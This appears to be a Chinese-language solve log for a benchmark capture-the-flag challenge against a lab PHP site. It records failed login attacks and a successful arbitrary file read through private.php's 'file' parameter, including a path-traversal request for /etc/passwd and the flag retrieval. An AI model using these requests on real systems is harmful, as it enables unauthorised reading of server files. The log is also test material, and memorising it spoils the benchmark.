# xben-098-24 · 探索记录

对应题解：[`xben-098-24.md`](./xben-098-24.md)

## 目标与起点

`10.0.172.219:80`，PHP 站点。`/private.php` 不登录也能打开，内容是空白的 Private Zone。

## 第一阶段：登录是死路

`test:test`、`admin:admin`、SQLi、magic hash 全部只回到同一张 1KB 登录页，没有成功态。

## 第二阶段：private.php 的参数

| 请求 | 结果 |
| --- | --- |
| `?action=1` | 列出根目录：`.htaccess Dockerfile about.php contact.php images index.php login.php private.php style.css xbow-flag.txt` |
| `?file=xbow-flag.txt` | **flag** |
| `?file=../../../../etc/passwd` | 返回 passwd，确认是任意文件读 |

顺手读了 `private.php` 的源码：`$file` 直接 `file_get_contents`，`$action` 直接 `scandir('.')`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 登录爆破 / SQL 注入 | 全部失败 | 响应恒为 1KB 登录页 |
| 目录爆破 /images 等 | 403 或无内容 | 真正的入口是 private.php 的参数 |

## 这次真正的收获

「看起来需要登录」的页面先直接打开；打开后先试 `action`、`file`、`page` 这类参数。
